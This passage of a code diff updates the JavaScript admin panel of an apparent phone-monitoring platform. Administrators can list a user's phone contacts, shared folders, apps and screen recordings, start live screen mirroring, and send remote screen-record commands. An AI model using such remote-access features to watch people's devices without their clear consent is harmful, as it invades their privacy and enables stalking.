+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${items
+    .slice(0, 80)
+    .map(
+      (c) =>
+        `<li>
+          <strong>${escapeHtml(c.displayName || c.name || "Contact")}</strong>
+          <span class="muted"> · ${escapeHtml(c.phone || c.number || (c.phones || [])[0] || "")}</span>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function renderFilesPanel() {
+  const el = document.getElementById("admin-files-body");
+  if (!el || !exploreCtx) return;
+  const grants = exploreCtx.data.folderGrants || [];
+  if (!grants.length) {
+    el.innerHTML = emptyHint(
+      "No shared folders yet. On the phone, grant folder access under Permissions, then tap Refresh folders here."
+    );
+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${grants
+    .map(
+      (g) =>
+        `<li>
+          <strong>${escapeHtml(g.displayName || g.name || g.path || g.id)}</strong>
+          <div class="muted">${escapeHtml(g.uri || g.path || "")}</div>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function renderScreenPanel() {
+  const el = document.getElementById("admin-screen-body");
+  if (!el || !exploreCtx) return;
+  el.innerHTML = `
+    <p class="muted">Starts screen mirror via Platform Admin. Android will show the system cast dialog on the phone.</p>
+    <div class="connect-actions" style="margin-top:12px;">
+      <button type="button" class="btn-primary" id="btn-admin-screen-start">Start screen mirror</button>
+      <button type="button" class="btn-danger" id="btn-admin-screen-stop">Stop</button>
+    </div>
+    <p id="screen-live-status" class="muted" style="margin-top:10px;" aria-live="polite"></p>
+    <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted controls hidden></video>
+  `;
+  document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
+    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, ["screenMirror"], false, "auto", {
+      statusId: "screen-live-status",
+      videoId: "admin-screen-video",
+    });
+  });
+  document.getElementById("btn-admin-screen-stop")?.addEventListener("click", async () => {
+    await stopLiveViewer();
+    const st = document.getElementById("screen-live-status");
+    if (st) st.textContent = "Screen mirror stopped.";
+    const v = document.getElementById("admin-screen-video");
+    if (v) v.hidden = true;
+  });
+}
+
+function renderRecordingPanel() {
+  const el = document.getElementById("admin-recording-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.screenRecordings || [];
+  el.innerHTML = items.length
+    ? `<ul class="admin-readable-list">${items
+        .slice(0, 30)
+        .map(
+          (r) =>
+            `<li>
+              <strong>${escapeHtml(r.displayName || r.name || r.id)}</strong>
+              <span class="muted"> · ${escapeHtml(r.status || "")} · ${fmtTime(r.createdAt || r.startedAt)}</span>
+            </li>`
+        )
+        .join("")}</ul>`
+    : emptyHint("No screen recordings cached yet.");
+}
+
+function renderAppsPanel() {
+  const el = document.getElementById("admin-apps-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.apps || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No apps cached. Tap Sync apps.");
+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${items
+    .slice(0, 100)
+    .map(
+      (a) =>
+        `<li>
+          <strong>${escapeHtml(a.appName || a.label || a.packageName)}</strong>
+          <div class="muted"><code>${escapeHtml(a.packageName || "")}</code> · v${escapeHtml(a.versionName || "?")}</div>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function wireAdminCommands() {
+  document.querySelectorAll("[data-admin-cmd]").forEach((btn) => {
+    btn.onclick = () => {
+      if (!exploreCtx) return;
+      void runDeviceCommand(
+        exploreCtx.ownerUid,
+        exploreCtx.deviceId,
+        btn.getAttribute("data-admin-cmd")
+      );
+    };
+  });
+  const recStart = document.getElementById("btn-admin-rec-start");
+  const recStop = document.getElementById("btn-admin-rec-stop");
+  if (recStart) {
+    recStart.onclick = () => {
+      if (!exploreCtx) return;
+      void runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_START");
+    };
+  }
+  if (recStop) {
+    recStop.onclick = () => {
+      if (!exploreCtx) return;
+      void runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_STOP");
+    };
+  }
 }
 
 async function runDeviceCommand(ownerUid, deviceId, action) {
-  const status =
-    document.getElementById("device-action-status") || document.getElementById("live-status");
+  const status = document.getElementById("admin-action-status");
   try {
     if (status) status.textContent = `Sending ${action}…`;
     await api(
       `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
       { method: "POST", body: JSON.stringify({ action, payload: {} }) }
     );
-    if (status) status.textContent = `${action} sent. Refresh in a few seconds for new cached data.`;
+    if (status) {
+      status.textContent = `${action} sent. Waiting for phone… refreshing in 3s.`;
+    }
+    setTimeout(() => {
+      void openDeviceExplore(ownerUid, deviceId);
+    }, 3000);
   } catch (e) {
     if (status) status.textContent = formatApiError(e);
     else alert(formatApiError(e));
   }
 }
 
-async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
-  const status = document.getElementById("live-status");
-  const video = document.getElementById("admin-live-video");
+async function startLive(ownerUid, deviceId, capabilities, forceReplace, quality = "auto", opts = {}) {
+  const statusId = opts.statusId || "live-status";
+  const videoId = opts.videoId || "admin-live-video";
+  const status = document.getElementById(statusId);
+  const video = document.getElementById(videoId);
   try {
     await stopLiveViewer();
     if (status) status.textContent = "Starting live session…";
+    if (video) video.hidden = false;
+    show(document.getElementById("admin-live-panel"), true);
+    const endBtn = document.getElementById("btn-admin-end-live");
+    if (endBtn) endBtn.hidden = false;
+
     let result;
     try {
       result = await api(
         `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
         {
           method: "POST",
-          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace) }),
+          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace), quality }),
         }
       );
     } catch (e) {
@@ -543,7 +940,7 @@ async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
           `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
           {
             method: "POST",
-            body: JSON.stringify({ capabilities, forceReplace: true }),
+            body: JSON.stringify({ capabilities, forceReplace: true, quality }),
           }
         );
       } else {
@@ -572,14 +969,6 @@ async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
   }
 }
 
-function escapeHtml(s) {
-  return String(s || "")
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;");
-}
-
 async function enterAdmin(user) {
   idToken = await user.getIdToken(true);
   const me = await api("/api/admin/me");
@@ -599,10 +988,12 @@ async function enterAdmin(user) {
 
 function setLoggedOut() {
   idToken = "";
+  void stopLiveViewer();
+  exploreCtx = null;
+  openUserUid = "";
   show(viewApp, false);
   show(viewDenied, false);
   show(viewLogin, true);
-  closeDrawer();
 }
 
 async function main() {
@@ -613,7 +1004,7 @@ async function main() {
   const app = initializeApp(cfg.firebase);
   auth = getAuth(app);
 
-  document.querySelectorAll(".admin-tab").forEach((btn) => {
+  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
     btn.addEventListener("click", () => setTab(btn.getAttribute("data-tab") || "dashboard"));
   });
   document.getElementById("btn-users-refresh")?.addEventListener("click", () => loadUsers());
@@ -621,11 +1012,29 @@ async function main() {
     if (ev.key === "Enter") void loadUsers();
   });
   document.getElementById("users-status")?.addEventListener("change", () => loadUsers());
-  document.getElementById("btn-drawer-close")?.addEventListener("click", closeDrawer);
-  document.getElementById("user-drawer")?.addEventListener("click", (ev) => {
-    if (ev.target === document.getElementById("user-drawer")) closeDrawer();
+
+  document.getElementById("btn-back-users")?.addEventListener("click", () => {
+    void stopLiveViewer();
+    setUsersSubview("list");
   });
-  wireDeviceDrawer();
+  document.getElementById("btn-back-user-devices")?.addEventListener("click", () => {
+    void stopLiveViewer();
+    if (openUserUid) void openUser(openUserUid);
+    else setUsersSubview("list");
+  });
+  document.getElementById("btn-device-refresh")?.addEventListener("click", () => {
+    if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+  });
+  document.getElementById("admin-device-select")?.addEventListener("change", (ev) => {
+    const deviceId = ev.target.value;
+    if (exploreCtx?.ownerUid && deviceId) {
+      void stopLiveViewer();
+      void openDeviceExplore(exploreCtx.ownerUid, deviceId);
+    }
+  });
+  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
+    btn.addEventListener("click", () => setPhoneTab(btn.getAttribute("data-phone-tab") || "camera"));
+  });
 
   document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
     const input = document.getElementById("admin-email-input");
